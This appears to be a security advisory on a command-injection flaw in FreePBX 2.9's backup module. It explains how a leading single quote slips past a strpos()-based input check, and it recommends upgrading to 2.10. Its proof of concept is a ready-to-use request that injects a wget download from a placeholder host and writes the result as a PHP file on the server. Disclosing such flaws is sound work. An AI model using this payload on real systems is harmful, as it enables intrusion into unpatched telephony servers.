- Introduction: 

  FreePBX is an (graphical user interface) that controls and manages Asterisk, the world's most popular open source telephony engine software.
  FreePBX has been developed and hardened by 	thousands of volunteers over tens of thousands man hours. 
  FreePBX has been downloaded over 5,000,000 times and estimates over 500,000 active phone systems.

- Vulnerability Explanation:

  The vulnerability affects the "page.backup.php" file in the Backup Module of the FreePBX 2.9 which lead to a remote command execution
  The affected $dir parameter is already sanitized and protected in the code but it suffers from  a weakness that can be used to bypass this sanitization
  
  The following if condition code is used to protect and sanitize the $dir variable in page.backup.php:

	if (strstr($dir, '..') || strpos($dir, '\'') || strpos($dir, '"') || strpos($dir, '\'') || strpos($dir,'\`') ||
	    strstr($file, '..') || strpos($file, '\'') || strpos($file, '"') || strpos($file, '\'') || strpos($file,'\`') ||
	    strpos($id, '.') || strpos($id, '\'') || strpos($id, '"') || strpos($id, '\'') || strpos($id,'\`') ||
	    strpos($filetype, '.') || strpos($filetype, '\'') || strpos($filetype, '"') || strpos($filetype, '\'') || strpos($filetype,'\`')) {
		print "You're trying to use an invalid character. Please don't.\n";
		exit;
	}
  
  but unfortunately there is a weakness in using strpos() that could be used to bypass the sanitization
  
  so the first position of a character in a string will be 0 and this is the trick which will be used to bypass the sanitization function 
  
  if the single quote is the first character in the $dir variable then the strpos function will return 0 number 
  And if() statement doesn't check for the return type it only check for value so it will consider 0 returned from strpos() as a boolean value not an integer
  the 0 for boolean means FALSE so the if condition will be False and it won't detect the single quote at the variable so it will bypass it :)
  
  
- Vulnerable Code Snippet at /admin/modules/backup/page.backup.php

  LINE 25: $action = isset($_REQUEST['action'])?$_REQUEST['action']:'';
  LINE 29: $dir=isset($_REQUEST['dir'])?$_REQUEST['dir']:'';
  LINE 35: // The Sanitization code as mentioned
  LINE 44: switch ($action) { 
  LINE 64: case "deletedataset":
  LINE 65: exec("/bin/rm -rf '$dir'");

- Proof of Concept:

  > To Execute command: wget http://site.com/file.txt -O file.php
 
    http://[ip]/freepbx/admin/modules/backup/page.backup.php?action=deletedataset&dir=';wget http://site.com/file.txt -O file.php; echo 'mission done

  > The the evaluated command will be: 
 
    /bin/rm -rf '';wget http://site.com/file.txt -O file.php; echo 'mission done'
    
- Fix / Solution:

 you should upgrade to version 2.10
